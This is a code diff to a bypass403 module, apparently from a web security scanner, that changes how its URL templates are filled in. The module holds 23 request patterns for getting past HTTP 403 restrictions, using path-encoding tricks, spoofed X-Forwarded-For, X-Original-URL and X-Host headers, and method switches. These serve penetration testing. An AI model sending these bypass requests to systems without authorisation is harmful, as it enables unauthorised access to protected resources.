@@ -7,29 +7,29 @@ Port of https://github.com/iamj0ker/bypass-403/
 
 # ([int]id,[string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
 signatures = [
-    (1, "GET", "###SCHEME###://###NETLOC###/%2e/###PATH###", None, False),
-    (2, "GET", "###SCHEME###://###NETLOC###/###PATH###/.", None, True),
-    (3, "GET", "###SCHEME###://###NETLOC###//###PATH###//", None, True),
-    (4, "GET", "###SCHEME###://###NETLOC###/./###PATH###/./", None, True),
-    (5, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Original-URL": "###PATH###"}, False),
-    (6, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Custom-IP-Authorization": "127.0.0.1"}, False),
-    (7, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Forwarded-For": "http://127.0.0.1"}, False),
-    (8, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Forwarded-For": "127.0.0.1:80"}, False),
-    (9, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-rewrite-url": "nonsense"}, False),
-    (10, "GET", "###SCHEME###://###NETLOC###/###PATH###%20", None, True),
-    (11, "GET", "###SCHEME###://###NETLOC###/###PATH###%09", None, True),
-    (12, "GET", "###SCHEME###://###NETLOC###/###PATH###?", None, True),
-    (13, "GET", "###SCHEME###://###NETLOC###/###PATH###.html", None, False),
-    (14, "GET", "###SCHEME###://###NETLOC###/###PATH###/?anything", None, True),
-    (15, "GET", "###SCHEME###://###NETLOC###/###PATH####", None, False),
-    (16, "POST", "###SCHEME###://###NETLOC###/###PATH###", {"Content-Length": "0"}, False),
-    (17, "GET", "###SCHEME###://###NETLOC###/###PATH###/*", None, True),
-    (18, "GET", "###SCHEME###://###NETLOC###/###PATH###.php", None, False),
-    (19, "GET", "###SCHEME###://###NETLOC###/###PATH###.json", None, False),
-    (20, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Host": "127.0.0.1"}, False),
-    (21, "GET", "###SCHEME###://###NETLOC###/###PATH###..;/", None, False),
-    (22, "GET", "###SCHEME###://###NETLOC###/###PATH###;/", None, False),
-    (23, "TRACE", "###SCHEME###://###NETLOC###/###PATH###/", None, True),
+    (1, "GET", "{scheme}://{netloc}/%2e/{path}", None, False),
+    (2, "GET", "{scheme}://{netloc}/{path}/.", None, True),
+    (3, "GET", "{scheme}://{netloc}//{path}//", None, True),
+    (4, "GET", "{scheme}://{netloc}/./{path}/./", None, True),
+    (5, "GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
+    (6, "GET", "{scheme}://{netloc}/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}, False),
+    (7, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
+    (8, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "127.0.0.1"}, False),
+    (9, "GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
+    (10, "GET", "{scheme}://{netloc}/{path}%20", None, True),
+    (11, "GET", "{scheme}://{netloc}/{path}%09", None, True),
+    (12, "GET", "{scheme}://{netloc}/{path}?", None, True),
+    (13, "GET", "{scheme}://{netloc}/{path}.html", None, False),
+    (14, "GET", "{scheme}://{netloc}/{path}/?anything", None, True),
+    (15, "GET", "{scheme}://{netloc}/{path}#", None, False),
+    (16, "POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
+    (17, "GET", "{scheme}://{netloc}/{path}/*", None, True),
+    (18, "GET", "{scheme}://{netloc}/{path}.php", None, False),
+    (19, "GET", "{scheme}://{netloc}/{path}.json", None, False),
+    (20, "GET", "{scheme}://{netloc}/{path}", {"X-Host": "127.0.0.1"}, False),
+    (21, "GET", "{scheme}://{netloc}/{path}..;/", None, False),
+    (22, "GET", "{scheme}://{netloc}/{path};/", None, False),
+    (23, "TRACE", "{scheme}://{netloc}/{path}/", None, True),
 ]
 
 
@@ -80,14 +80,16 @@ class bypass403(BaseModule):
             cleaned_path = event.parsed.path.strip("/")
         else:
             cleaned_path = event.parsed.path.lstrip("/")
+        kwargs = {
+            "scheme": event.parsed.scheme,
+            "netloc": event.parsed.netloc,
+            "path": cleaned_path
+        }
         formatted_url = (
-            sig[2]
-            .replace("###SCHEME###", event.parsed.scheme)
-            .replace("###NETLOC###", event.parsed.netloc)
-            .replace("###PATH###", cleaned_path)
+            sig[2].format(**kwargs)
         )
         if sig[3] != None:
-            formatted_headers = {k: v.format(event=event) for k, v in sig[3].items()}
+            formatted_headers = {k: v.format(**kwargs) for k, v in sig[3].items()}
         else:
             formatted_headers = None
         return (sig[0], sig[1], formatted_url, formatted_headers)
